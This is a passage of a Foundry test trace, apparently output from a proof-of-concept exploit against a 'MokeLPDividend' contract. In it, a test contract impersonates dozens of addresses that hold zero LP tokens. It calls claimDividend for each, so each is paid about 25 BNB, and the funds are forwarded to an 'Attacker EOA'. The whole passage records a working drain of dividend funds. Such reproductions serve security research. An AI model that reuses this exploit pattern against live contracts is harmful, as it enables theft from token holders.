+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x76F046429297956f5F16a62BfA3d6B62F2caa607)
+    │   ├─ [0] VM::prank(0x76F046429297956f5F16a62BfA3d6B62F2caa607)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x76F046429297956f5F16a62BfA3d6B62F2caa607) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x76F046429297956f5F16a62BfA3d6B62F2caa607, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x76F046429297956f5F16a62BfA3d6B62F2caa607::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x76F046429297956f5F16a62BfA3d6B62F2caa607, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2f50d272db55c68869a73df488b322deb79f2d3abf13057d6566e9431340577f: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x76F046429297956f5F16a62BfA3d6B62F2caa607)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E)
+    │   ├─ [0] VM::prank(0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf406c88990c2dac878a9c63f30cfc4db7703dfa746b8359432474deeca8d1c01: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x4940e363D77AF5941d0278fB4B9AEB38287c1608)
+    │   ├─ [0] VM::prank(0x4940e363D77AF5941d0278fB4B9AEB38287c1608)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x4940e363D77AF5941d0278fB4B9AEB38287c1608) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x4940e363D77AF5941d0278fB4B9AEB38287c1608, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x4940e363D77AF5941d0278fB4B9AEB38287c1608::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x4940e363D77AF5941d0278fB4B9AEB38287c1608, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdefce949f2ccdc7ed7c2bf6868e2ad491bff3756fbd09fb6c8f8e68b0d606865: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x4940e363D77AF5941d0278fB4B9AEB38287c1608)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xff2b0b60e18F3A99Ad18230A1493A50051978A4e)
+    │   ├─ [0] VM::prank(0xff2b0b60e18F3A99Ad18230A1493A50051978A4e)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xff2b0b60e18F3A99Ad18230A1493A50051978A4e) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xff2b0b60e18F3A99Ad18230A1493A50051978A4e, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xff2b0b60e18F3A99Ad18230A1493A50051978A4e::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xff2b0b60e18F3A99Ad18230A1493A50051978A4e, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7d15e98fa37fd178c37b1a1a11e25ac0aabe7627d4d0814de138549f2528ea74: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xff2b0b60e18F3A99Ad18230A1493A50051978A4e)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb)
+    │   ├─ [0] VM::prank(0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x01f138fce115dfcddb9e46e26c76a81f40d43b7c69cef0bf6647f9935852cd17: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x66F5013Caa936Cd8995dC84f9D51e352965e7d32)
+    │   ├─ [0] VM::prank(0x66F5013Caa936Cd8995dC84f9D51e352965e7d32)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x66F5013Caa936Cd8995dC84f9D51e352965e7d32) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x66F5013Caa936Cd8995dC84f9D51e352965e7d32, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x66F5013Caa936Cd8995dC84f9D51e352965e7d32::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x66F5013Caa936Cd8995dC84f9D51e352965e7d32, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfcb5207f4eba65b7f3354f8c11993d14313bbfb6e50659b1a0f9d80a277df2f4: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x66F5013Caa936Cd8995dC84f9D51e352965e7d32)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x1640268c40fD2fE9ba3A06F7b1b707f185072a74)
+    │   ├─ [0] VM::prank(0x1640268c40fD2fE9ba3A06F7b1b707f185072a74)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x1640268c40fD2fE9ba3A06F7b1b707f185072a74) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x1640268c40fD2fE9ba3A06F7b1b707f185072a74, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x1640268c40fD2fE9ba3A06F7b1b707f185072a74::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x1640268c40fD2fE9ba3A06F7b1b707f185072a74, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf9ee0a1b0180c0857dcd40d9e00692622f442e06cb4184797bd5edce687162cb: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x1640268c40fD2fE9ba3A06F7b1b707f185072a74)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336)
+    │   ├─ [0] VM::prank(0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x19744e31ade10879a4d698f9b340818ad00d775e1985f8b8fdc3ffdff3d8fe47: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xb05FED5a5cd7323930e35091f00A501134044a21)
+    │   ├─ [0] VM::prank(0xb05FED5a5cd7323930e35091f00A501134044a21)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xb05FED5a5cd7323930e35091f00A501134044a21) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xb05FED5a5cd7323930e35091f00A501134044a21, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xb05FED5a5cd7323930e35091f00A501134044a21::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xb05FED5a5cd7323930e35091f00A501134044a21, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc83607d0b3ef9a6e32e35ec9c319afa4effb0a9ec6ac2cfcff22f3626789dca4: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xb05FED5a5cd7323930e35091f00A501134044a21)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x3593745916604c81E5a2bAD33849C3219749aDb0)
+    │   ├─ [0] VM::prank(0x3593745916604c81E5a2bAD33849C3219749aDb0)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x3593745916604c81E5a2bAD33849C3219749aDb0) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x3593745916604c81E5a2bAD33849C3219749aDb0, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x3593745916604c81E5a2bAD33849C3219749aDb0::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x3593745916604c81E5a2bAD33849C3219749aDb0, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1097b0000781e3bf418330366b78ce5ece788e4bfead809318e70c0109e78db9: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x3593745916604c81E5a2bAD33849C3219749aDb0)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F)
+    │   ├─ [0] VM::prank(0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb5c3d876405559b1a08b22529b858c5acc62603b3a38fc14e27b91ab9c6d002f: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0)
+    │   ├─ [0] VM::prank(0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x106e35da14d83967194083ebda08230780015d344c04f0a54ddbfe17cf23b1e8: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D)
+    │   ├─ [0] VM::prank(0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf30e3492ef997616fe55e34cfff139f4a4a9409343ff46de5d8dec51a7996e7d: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907)
+    │   ├─ [0] VM::prank(0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9208e576a8b9a0e5bbd5dc3a7fdcb3229ad51953fcfe4eb560482d13ca67990c: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xd34b989569aA4997E83877B95F93b2dB20ae89b7)
+    │   ├─ [0] VM::prank(0xd34b989569aA4997E83877B95F93b2dB20ae89b7)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xd34b989569aA4997E83877B95F93b2dB20ae89b7) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xd34b989569aA4997E83877B95F93b2dB20ae89b7, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xd34b989569aA4997E83877B95F93b2dB20ae89b7::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xd34b989569aA4997E83877B95F93b2dB20ae89b7, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfa09b8fc79d7be25805eafe7a9c6de0558f0f238dbb403982f22d71faea390cc: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xd34b989569aA4997E83877B95F93b2dB20ae89b7)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59)
+    │   ├─ [0] VM::prank(0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb6a3441760ca9d9040228b7624ce041b01ea2b123faefe22da547e181348fe9d: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f)
+    │   ├─ [0] VM::prank(0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4e12e89824d1c7842f715dee84f111388f2dba92028acc833f351ccffa0dd446: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d)
+    │   ├─ [0] VM::prank(0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4ee6fcfa1fc2f98aa873b5336f1255ef894daf4749ede413eca459d3e9503479: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83)
+    │   ├─ [0] VM::prank(0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6cc0045de49284c1915c02923468849cab7048608c62a65dacaae52fb0f61b98: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef)
+    │   ├─ [0] VM::prank(0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc1dc08f9d3fbae38d9187c95262d777d28b6e2814eec19fda606139fbf67cdeb: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xfeb8907cB8F4dB64aCc4051c634fe990B823d378)
+    │   ├─ [0] VM::prank(0xfeb8907cB8F4dB64aCc4051c634fe990B823d378)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xfeb8907cB8F4dB64aCc4051c634fe990B823d378) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xfeb8907cB8F4dB64aCc4051c634fe990B823d378, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xfeb8907cB8F4dB64aCc4051c634fe990B823d378::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
